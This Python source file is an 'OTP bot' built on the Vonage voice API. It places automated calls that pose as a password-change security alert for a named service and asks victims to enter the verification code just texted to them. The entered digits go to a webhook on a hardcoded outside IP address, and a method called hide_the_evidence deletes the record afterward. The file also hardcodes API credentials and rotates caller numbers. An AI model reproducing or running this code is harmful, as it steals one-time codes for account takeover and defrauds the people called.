import vonage # pip install vonage (https://github.com/vonage/vonage-python-sdk)
import os
import random
import uuid
import requests


class OTP:
    def __init__(self, phone_number: str, name: str, otp_length: int, service: str) -> None:
        self.client = vonage.Client(key="837a8b98", secret="EFpGNm5eQbnPbt2r", application_id="680df8dd-7bf1-49bc-993d-8af5696556b7", private_key=f"{os.getcwd()}/private.key")
        self.available = ["19162347980", "19173387271"]
        self.pn = phone_number
        self.name = name
        self.oplen = otp_length
        self.service = service
        self.ukey = str(uuid.uuid4())

    async def get_status(self, response):
        last_resp = None
        times = 0
        
        while True:
            client_resp = self.client.voice.get_call(response.get('uuid')).get("status")
            if client_resp == "ringing":
                times += 1
                
            if times > 250:
                yield "declined"
                break
            if client_resp != last_resp:
                last_resp = client_resp
                yield client_resp
            
            if last_resp in ["completed", "busy"]:
                break
    
    def hide_the_evidence(self):
        res = requests.delete(f"http://45.128.232.18:5000/dev/database?access=dev69&diguuid={self.ukey}")
        return res.text
                
    async def make_call(self):
        response = self.client.voice.create_call({
            'to': [{'type': 'phone', 'number': self.pn}],
            'from': {'type': 'phone', 'number': random.choice(self.available)},
            'ncco': [
                {
                    'action': 'talk', 
                    'text': f'Hello {self.name}, this is an automated call regarding a request to change your {self.service} password. If this was you feel free to hang up. If this was not you, please enter the {self.oplen} digit verification code sent to your phone.'
                },
                {
                    "action": "input",
                    "type": ["dtmf"],
                    "dtmf": {
                        "maxDigits": self.oplen
                    },
                    "eventUrl": [f"http://45.128.232.18:5000/webhooks/digits?key={self.ukey}"]
                },
                {
                    'action': 'talk', 
                    'text': f'Thank you, The request has been blocked'
                }
            ]
        })
        return response